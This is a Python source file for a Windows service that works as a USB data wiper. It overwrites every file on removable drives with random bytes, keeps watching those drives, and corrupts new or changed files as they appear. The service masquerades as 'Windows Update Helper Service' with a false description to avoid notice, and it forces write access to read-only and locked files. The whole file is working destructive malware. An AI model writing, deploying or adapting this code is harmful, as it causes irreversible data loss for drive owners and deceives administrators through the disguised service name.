"""
USB Drive File Overwriter Service
Overwrites ALL files on external USB drives with random binary data
Monitors file changes and processes drives already connected at boot
Ignores internal hard drives and fixed disks
"""

import os
import sys
import time
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
from datetime import datetime
import string
from ctypes import windll
import win32api
import traceback
import threading
import win32file
import win32con

class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsUpdateHelperService"
    _svc_display_name_ = "Windows Update Helper Service"
    _svc_description_ = "Provides auxiliary support for Windows Update operations"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        socket.setdefaulttimeout(60)
        
        # Store initial system drives to ignore them
        self.system_drives = set()
        self.initialize_system_drives()
        
        # Error handling and recovery
        self.consecutive_errors = 0
        self.max_consecutive_errors = 10
        self.last_error_time = None
        
        # File monitoring threads
        self.file_monitor_threads = {}
        self.monitored_drives = set()
        
        # Track processed drives to avoid reprocessing
        self.processed_drives = set()

    def initialize_system_drives(self):
        """
        Store ONLY fixed/internal drives (Type 3) that exist at service startup
        Removable drives (Type 2) will ALWAYS be monitored, even if present at startup
        """
        try:
            for letter in string.ascii_uppercase:
                drive_path = f"{letter}:\\"
                try:
                    if os.path.exists(drive_path):
                        drive_type = windll.kernel32.GetDriveTypeW(drive_path)
                        # ONLY store Type 3 (fixed/internal hard drives) to ignore
                        # Type 2 (removable) will always be monitored
                        if drive_type == 3:  # DRIVE_FIXED only
                            self.system_drives.add(letter)
                except Exception as e:
                    # Skip drives that can't be accessed
                    continue
            
            servicemanager.LogInfoMsg(f"Fixed system drives (will be ignored): {', '.join(sorted(self.system_drives)) if self.system_drives else 'None'}")
        except Exception as e:
            servicemanager.LogErrorMsg(f"Error identifying system drives: {str(e)}")

    def SvcStop(self):
        """Stop the service"""
        try:
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
            win32event.SetEvent(self.stop_event)
            self.running = False
            servicemanager.LogInfoMsg("Service stop requested")
        except Exception as e:
            servicemanager.LogErrorMsg(f"Error stopping service: {str(e)}")

    def SvcDoRun(self):
        """Run the service with robust error handling"""
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        
        try:
            self.main()
        except Exception as e:
            servicemanager.LogErrorMsg(f"Fatal error in service main loop: {str(e)}")
            servicemanager.LogErrorMsg(traceback.format_exc())
            # Even on fatal error, log it and let the service recovery handle restart
            time.sleep(5)

    def get_available_drives(self):
        """Get list of all available drive letters with error handling"""
        drives = []
        try:
            bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drives.append(letter)
                bitmask >>= 1
        except Exception as e:
            servicemanager.LogErrorMsg(f"Error getting drive list: {str(e)}")
        return drives

    def is_external_removable_drive(self, drive):
        """
        Check if drive is an external removable drive (USB, external HDD, etc.)
        Returns True for ANY Type 2 (removable) drive, regardless of when it was plugged in
        Only ignores Type 3 (fixed/internal) drives
        Includes extensive error handling
        """
        try:
            # Check if it's a fixed system drive (like C:)
            if drive in self.system_drives:
                return False
            
            drive_path = f"{drive}:\\"
            
            # Check if path exists
            if not os.path.exists(drive_path):
                return False
            
            # Get drive type with timeout protection
            try:
                drive_type = windll.kernel32.GetDriveTypeW(drive_path)
            except Exception as e:
                servicemanager.LogErrorMsg(f"Error getting drive type for {drive}: {str(e)}")
                return False
            
            # Type 2 = DRIVE_REMOVABLE (USB drives, memory cards, external HDDs, etc.)
            # We want ALL Type 2 drives, even if they were present at startup
            if drive_type == 2:
                return True
            
            return False
            
        except Exception as e:
            servicemanager.LogErrorMsg(f"Error checking drive {drive}: {str(e)}")
            return False

    def overwrite_all_files(self, drive):
        """Find and overwrite ALL files with random binary data"""
        max_retries = 3
        retry_delay = 1
        files_overwritten = 0
        
        for attempt in range(max_retries):
            try:
                drive_path = f"{drive}:\\"
                
                # Walk through all directories on the drive
                for root, dirs, files in os.walk(drive_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        try:
                            # Skip system files and hidden files to avoid issues
                            if file.startswith('.') or file.lower() in ['system volume information', 'recycler', '$recycle.bin']:
                                continue
                                
                            # Use aggressive overwriting method
                            self.overwrite_single_file_aggressive(file_path)
                            files_overwritten += 1
                            
                        except (PermissionError, OSError) as e:
                            # Skip files that can't be accessed (system files, etc.)
                            servicemanager.LogInfoMsg(f"Skipped protected file {file_path}: {str(e)}")
                            continue
                        except Exception as e:
                            servicemanager.LogErrorMsg(f"Failed to overwrite {file_path}: {str(e)}")
                            continue
                
                if files_overwritten > 0:
                    log_msg = f"Successfully overwritten {files_overwritten} files on drive {drive}:"
                    servicemanager.LogInfoMsg(log_msg)
                else:
                    servicemanager.LogInfoMsg(f"No accessible files found on drive {drive}:")
                
                # Reset error counter on success
                self.consecutive_errors = 0
                return True
                
            except Exception as e:
                if attempt < max_retries - 1:
                    servicemanager.LogWarningMsg(f"Attempt {attempt + 1} failed for drive {drive}: {str(e)}. Retrying...")
                    time.sleep(retry_delay)
                else:
                    servicemanager.LogErrorMsg(f"Failed to process files on {drive} after {max_retries} attempts: {str(e)}")
                    return False
        
        return False

    def monitor_drive_files(self, drive):
        """Monitor file changes on a USB drive and overwrite new/modified files"""
        drive_path = f"{drive}:\\"
        
        try:
            # Create directory handle for monitoring
            hDir = win32file.CreateFile(
                drive_path,
                win32file.GENERIC_READ,
                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
                None,
                win32file.OPEN_EXISTING,
                win32file.FILE_FLAG_BACKUP_SEMANTICS,
                None
            )
            
            servicemanager.LogInfoMsg(f"Started file monitoring on drive {drive}:")
            
            while self.running and drive in self.monitored_drives:
                try:
                    # Monitor for file changes with more comprehensive flags
                    results = win32file.ReadDirectoryChangesW(
                        hDir,
                        1024,
                        True,  # Watch subdirectories
                        win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                        win32con.FILE_NOTIFY_CHANGE_SIZE |
                        win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                        win32con.FILE_NOTIFY_CHANGE_CREATION,
                        None,
                        None
                    )
                    
                    for action, file_name in results:
                        if not self.running:
                            break
                            
                        file_path = os.path.join(drive_path, file_name)
                        
                        # Check if it's a file creation or modification
                        if action in [win32con.FILE_ACTION_ADDED, 
                                    win32con.FILE_ACTION_MODIFIED,
                                    win32con.FILE_ACTION_RENAMED_NEW_NAME]:
                            
                            # Immediate overwrite attempt (no delay)
                            try:
                                if os.path.isfile(file_path):
                                    self.overwrite_single_file_aggressive(file_path)
                            except Exception as e:
                                servicemanager.LogErrorMsg(f"Error overwriting monitored file {file_path}: {str(e)}")
                                
                            # Additional attempts with small delays to catch files that might be locked
                            for attempt in range(3):
                                time.sleep(0.1)  # Very short delay
                                try:
                                    if os.path.isfile(file_path):
                                        self.overwrite_single_file_aggressive(file_path)
                                        break  # Success, no need for more attempts
                                except Exception:
                                    continue
                                
                except Exception as e:
                    if self.running:
                        servicemanager.LogErrorMsg(f"Error in file monitoring for drive {drive}: {str(e)}")
                        time.sleep(5)  # Wait before retrying
                    break
                    
        except Exception as e:
            servicemanager.LogErrorMsg(f"Failed to start file monitoring on drive {drive}: {str(e)}")
        finally:
            try:
                win32file.CloseHandle(hDir)
            except:
                pass
            servicemanager.LogInfoMsg(f"Stopped file monitoring on drive {drive}:")

    def overwrite_single_file_aggressive(self, file_path):
        """Aggressively overwrite a single file with random binary data, handling locks"""
        try:
            # Skip system files and hidden files
            file_name = os.path.basename(file_path)
            if file_name.startswith('.') or file_name.lower() in ['system volume information', 'recycler', '$recycle.bin']:
                return
            
            # Multiple attempts to handle file locks
            for attempt in range(5):
                try:
                    # Get original file size
                    original_size = os.path.getsize(file_path)
                    
                    # Skip very large files (>100MB)
                    if original_size > 100 * 1024 * 1024:
                        return
                    
                    # Try to remove read-only attribute if present
                    try:
                        import stat
                        current_attrs = os.stat(file_path).st_mode
                        if not (current_attrs & stat.S_IWRITE):
                            os.chmod(file_path, current_attrs | stat.S_IWRITE)
                    except:
                        pass
                    
                    # Generate random binary data
                    random_data = os.urandom(original_size)
                    
                    # Try to open with different sharing modes to force access
                    try:
                        # First try: Normal write mode
                        with open(file_path, 'wb') as f:
                            f.write(random_data)
                            f.flush()
                            os.fsync(f.fileno())  # Force write to disk
                        break  # Success
                    except (PermissionError, OSError):
                        # Second try: Use Windows API for forced access
                        try:
                            hFile = win32file.CreateFile(
                                file_path,
                                win32file.GENERIC_WRITE,
                                0,  # No sharing - exclusive access
                                None,
                                win32file.OPEN_EXISTING,
                                win32file.FILE_ATTRIBUTE_NORMAL,
                                None
                            )
                            win32file.WriteFile(hFile, random_data)
                            win32file.CloseHandle(hFile)
                            break  # Success
                        except:
                            # Third try: Copy over the file
                            try:
                                temp_file = file_path + ".tmp"
                                with open(temp_file, 'wb') as f:
                                    f.write(random_data)
                                    f.flush()
                                    os.fsync(f.fileno())
                                
                                # Replace original with temp file
                                if os.path.exists(file_path):
                                    os.remove(file_path)
                                os.rename(temp_file, file_path)
                                break  # Success
                            except:
                                # Clean up temp file if it exists
                                try:
                                    if os.path.exists(temp_file):
                                        os.remove(temp_file)
                                except:
                                    pass
                                
                                # If this is not the last attempt, wait and retry
                                if attempt < 4:
                                    time.sleep(0.05)  # 50ms delay
                                    continue
                                else:
                                    raise  # Re-raise the last exception
                
                except Exception as e:
                    if attempt < 4:
                        time.sleep(0.05)  # 50ms delay before retry
                        continue
                    else:
                        raise e
            
            servicemanager.LogInfoMsg(f"Aggressively overwritten file: {file_path}")
            
        except (PermissionError, OSError):
            # Skip files that can't be accessed after all attempts
            pass
        except Exception as e:
            servicemanager.LogErrorMsg(f"Failed to aggressively overwrite {file_path}: {str(e)}")

    def start_file_monitoring(self, drive):
        """Start file monitoring thread for a drive"""
        if drive not in self.monitored_drives:
            self.monitored_drives.add(drive)
            # Start real-time monitoring thread
            thread = threading.Thread(target=self.monitor_drive_files, args=(drive,), daemon=True)
            thread.start()
            self.file_monitor_threads[drive] = thread
            
            # Start periodic scanning thread as backup
            scan_thread = threading.Thread(target=self.periodic_drive_scan, args=(drive,), daemon=True)
            scan_thread.start()
            self.file_monitor_threads[f"{drive}_scan"] = scan_thread

    def periodic_drive_scan(self, drive):
        """Periodically scan drive for any files that might have been missed"""
        drive_path = f"{drive}:\\"
        
        while self.running and drive in self.monitored_drives:
            try:
                # Scan every 5 seconds for any files
                for root, dirs, files in os.walk(drive_path):
                    if not self.running or drive not in self.monitored_drives:
                        break
                        
                    for file in files:
                        if not self.running:
                            break
                            
                        file_path = os.path.join(root, file)
                        
                        try:
                            # Check if file exists and overwrite it
                            if os.path.isfile(file_path):
                                self.overwrite_single_file_aggressive(file_path)
                        except Exception as e:
                            # Continue scanning other files
                            continue
                
                # Wait 5 seconds before next scan
                for _ in range(50):  # 5 seconds in 0.1 second increments
                    if not self.running or drive not in self.monitored_drives:
                        break
                    time.sleep(0.1)
                    
            except Exception as e:
                if self.running:
                    servicemanager.LogErrorMsg(f"Error in periodic scan for drive {drive}: {str(e)}")
                    time.sleep(5)
                break

    def stop_file_monitoring(self, drive):
        """Stop file monitoring for a drive"""
        if drive in self.monitored_drives:
            self.monitored_drives.discard(drive)
            if drive in self.file_monitor_threads:
                # Thread will stop when self.monitored_drives is updated
                del self.file_monitor_threads[drive]
            if f"{drive}_scan" in self.file_monitor_threads:
                del self.file_monitor_threads[f"{drive}_scan"]

    def main(self):
        """Main monitoring loop with robust error handling and recovery"""
        # Get initial drives (only external/removable ones)
        previous_drives = set()
        for drive in self.get_available_drives():
            if self.is_external_removable_drive(drive):
                previous_drives.add(drive)
        
        servicemanager.LogInfoMsg(f"USB Drive File Overwriter started. Monitoring ALL removable drives.")
        servicemanager.LogInfoMsg(f"Fixed drives (ignored): {', '.join(sorted(self.system_drives)) if self.system_drives else 'None'}")
        
        # PROCESS EXISTING USB DRIVES AT STARTUP
        if previous_drives:
            servicemanager.LogInfoMsg(f"Processing existing removable drives: {', '.join(sorted(previous_drives))}")
            for drive in previous_drives:
                try:
                    servicemanager.LogInfoMsg(f"Processing existing USB drive: {drive}:")
                    # Wait for drive to be fully ready
                    time.sleep(2)
                    # Process existing files
                    self.overwrite_all_files(drive)
                    # Start monitoring for new files
                    self.start_file_monitoring(drive)
                    # Mark as processed
                    self.processed_drives.add(drive)
                except Exception as e:
                    servicemanager.LogErrorMsg(f"Error processing existing drive {drive}: {str(e)}")
                    continue
        
        # Main monitoring loop
        while self.running:
            try:
                # Get current external/removable drives
                current_drives = set()
                for drive in self.get_available_drives():
                    if self.is_external_removable_drive(drive):
                        current_drives.add(drive)
                
                # Detect new external drives
                new_drives = current_drives - previous_drives
                for drive in new_drives:
                    try:
                        servicemanager.LogInfoMsg(f"New external USB drive detected: {drive}:")
                        # Wait for drive to be fully ready
                        time.sleep(2)
                        # Process all existing files
                        self.overwrite_all_files(drive)
                        # Start monitoring for new files
                        self.start_file_monitoring(drive)
                        # Mark as processed
                        self.processed_drives.add(drive)
                    except Exception as e:
                        servicemanager.LogErrorMsg(f"Error processing new drive {drive}: {str(e)}")
                        # Continue processing other drives even if one fails
                        continue
                
                # Detect removed drives and stop monitoring
                removed_drives = previous_drives - current_drives
                for drive in removed_drives:
                    servicemanager.LogInfoMsg(f"External USB drive removed: {drive}:")
                    self.stop_file_monitoring(drive)
                    self.processed_drives.discard(drive)
                
                # Ensure monitoring is active for all current drives
                for drive in current_drives:
                    if drive not in self.monitored_drives:
                        try:
                            self.start_file_monitoring(drive)
                        except Exception as e:
                            servicemanager.LogErrorMsg(f"Error starting monitoring for drive {drive}: {str(e)}")
                
                previous_drives = current_drives
                
                # Reset consecutive error counter on successful iteration
                self.consecutive_errors = 0
                
                # Check every 2 seconds
                if win32event.WaitForSingleObject(self.stop_event, 2000) == win32event.WAIT_OBJECT_0:
                    break
                    
            except Exception as e:
                self.consecutive_errors += 1
                error_msg = f"Error in monitoring loop (error #{self.consecutive_errors}): {str(e)}"
                servicemanager.LogErrorMsg(error_msg)
                servicemanager.LogErrorMsg(traceback.format_exc())
                
                # If too many consecutive errors, increase sleep time but keep running
                if self.consecutive_errors >= self.max_consecutive_errors:
                    servicemanager.LogErrorMsg(f"Too many consecutive errors ({self.consecutive_errors}). Entering recovery mode...")
                    time.sleep(30)  # Sleep longer on persistent errors
                    self.consecutive_errors = 0  # Reset counter
                else:
                    time.sleep(5)
        
        # Stop all file monitoring threads
        for drive in list(self.monitored_drives):
            self.stop_file_monitoring(drive)
        
        servicemanager.LogInfoMsg("USB Drive File Overwriter stopped gracefully")

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(USBDriveFileOverwriter)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(USBDriveFileOverwriter)